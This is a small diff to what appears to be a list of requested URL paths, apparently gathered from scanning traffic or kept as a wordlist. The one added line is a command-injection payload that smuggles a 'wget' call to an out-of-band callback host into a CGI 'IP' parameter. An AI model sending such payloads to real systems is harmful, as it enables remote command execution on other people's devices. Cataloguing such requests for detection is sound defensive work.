@@ -9691,3 +9691,4 @@ a
 /sap/admin/public/default.html
 /?gad_source=5&gclid=EAIaIQobChMI9rrCt7LligMVCm5BAh24uhmbEAEYASAAEgIqqvD_BwE
 /cgi-bin/nightled.cgi
+/cgi-bin/touchlist_sync.cgi?IP=;wget+http://ctu1e2la6l84rsl142k08zae6wsej3r48.oast.live;
